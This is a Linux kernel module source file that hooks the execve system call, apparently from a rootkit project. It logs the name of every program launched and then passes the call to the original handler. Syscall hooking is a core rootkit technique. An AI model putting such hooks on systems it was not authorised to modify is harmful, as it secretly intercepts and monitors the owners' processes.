#include <linux/module.h>
#include <linux/slab.h>

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

#include "../../../logger/logger.h"
#include "../../utils.h"
#include "execve.h"

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

struct execve_args explode_execve_args(const struct pt_regs *regs) {
    const struct execve_args args = {
         SYSCALL_ARG1(regs, const char __user *),
        SYSCALL_ARG2(regs, const char __user *const __user *),
        SYSCALL_ARG3(regs, const char __user *const __user *)
    };

    return args;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

asmlinkage long (*real_execve)(const struct pt_regs *);

// ////////////////////////////////////////////////////////////////////

asmlinkage long hook_execve(const struct pt_regs *regs) {
    const struct execve_args args = explode_execve_args(regs);
    char *kernel_filename = duplicate_filename(args.filename);

    rk_info("[hook_execve] execve() hooked for: %s\n", kernel_filename);

    const long ret = real_execve(regs);

    kfree(kernel_filename);

    // rk_info("execve() true return: %ld\n", ret);

    return ret;
}

// ////////////////////////////////////////////////////////////////////
// ////////////////////////////////////////////////////////////////////

EXPORT_SYMBOL(hook_execve);
EXPORT_SYMBOL(real_execve);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Aspheric_");
MODULE_DESCRIPTION("Hooks execve");
